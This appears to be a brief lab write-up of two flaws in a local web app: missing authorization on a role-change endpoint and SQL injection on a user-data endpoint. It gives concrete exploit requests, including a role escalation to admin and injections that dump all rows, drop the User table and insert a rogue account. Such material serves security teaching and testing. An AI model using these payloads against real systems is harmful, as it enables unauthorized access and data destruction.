1. **Broken Access Control:**
   - The `/change_user_role` endpoint lacks proper authorization checks. Any user can attempt to change roles without adequate validation.

2. **SQL Injection Vulnerability:**
   - The `/get_user_data` endpoint is vulnerable to SQL injection due to the direct use of user input in the SQL query.


### Exploiting Broken Access Control:

**Unauthorized Role Change Attempt:**
   - Method: POST
   - URL: `http://localhost:5000/change_user_role`
   - Body: `{"user_id": 1, "new_role": "admin"}`

### Exploiting SQL Injection:

**SQL Injection Attempt:**
   - Method: GET
   - URL: `http://localhost:5000/get_user_data?user_id=1 OR 1=1`
   
**SQL Injection Attempt to Drop Table:**
   - Method: GET
   - URL: `http://localhost:5000/get_user_data?user_id=1; DROP TABLE User`
**SQL Injection Attempt to add a new user:**
   - Method: GET
   - URL: `http://localhost:5000/get_user_data?user_id=1; INSERT INTO User (username, password, role) VALUES ('hacker', 'hacker', 'user')`

